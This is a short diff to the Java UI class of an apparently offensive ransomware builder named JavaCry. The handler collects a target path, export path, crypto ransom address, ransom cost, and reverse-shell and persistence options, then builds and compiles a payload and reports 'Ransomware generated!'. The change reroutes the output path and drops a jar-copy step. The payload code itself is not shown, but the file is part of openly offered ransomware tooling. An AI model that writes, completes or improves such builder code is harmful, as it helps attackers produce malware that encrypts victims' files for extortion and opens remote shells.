@@ -150,17 +150,11 @@ public class JRFUI {
                }
                boolean usePersistence = perInput.isSelected();
                
-               PayloadBuilder builder = new PayloadBuilder(tgtPath, CryptAddress, cost, useRevShell, usePersistence, host, revPort);
+               PayloadBuilder builder = new PayloadBuilder(tgtPath, expPath, CryptAddress, cost, useRevShell, usePersistence, host, revPort);
                builder.build();
                builder.compile();
 
-
-               try {
-                  Files.copy(new FileInputStream(new File("../../output/Classes/JavaCry.jar")), Paths.get(expPath, "JavaCry.jar"), StandardCopyOption.REPLACE_EXISTING);
-                  status.setText("Ransomware generated at " + expPath);
-               } catch (Exception err) {
-                  System.out.println(err);
-               }
+               status.setText("Ransomware generated! " + expPath);
                
             }
           });
